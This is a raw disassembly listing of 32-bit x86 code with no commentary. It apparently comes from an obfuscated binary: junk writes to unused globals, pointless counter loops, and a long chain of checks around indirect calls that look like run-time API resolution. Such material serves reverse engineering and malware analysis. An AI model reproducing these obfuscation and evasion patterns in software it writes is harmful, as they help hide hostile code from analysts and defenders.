  4206c9:	mov    esi,0xc7f2ab56
  4206ce:	std    
  4206cf:	out    0xcd,al
  4206d1:	or     eax,0x80ceab08
  4206d6:	jmp    0x83f4:0x78a7c6d5
  4206dd:	cmp    eax,0x3b59ae25
  4206e2:	inc    ebx
  4206e3:	push   edi
  4206e4:	out    dx,eax
  4206e5:	push   esp
  4206e6:	xchg   esp,eax
  4206e7:	cmp    edi,DWORD PTR [edi-0x30]
  4206ea:	hlt    
  4206eb:	mov    DWORD PTR [ebp-0x1c],edi
  4206ee:	mov    edi,DWORD PTR [ebp+0x8]
  4206f1:	xor    edi,ecx
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42aa07
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42a9c3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42a9d7
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a08b
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42a9db
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42a9df
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42a9e3
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42a9e7
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42a9eb
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42a9ef
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42a9f3
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
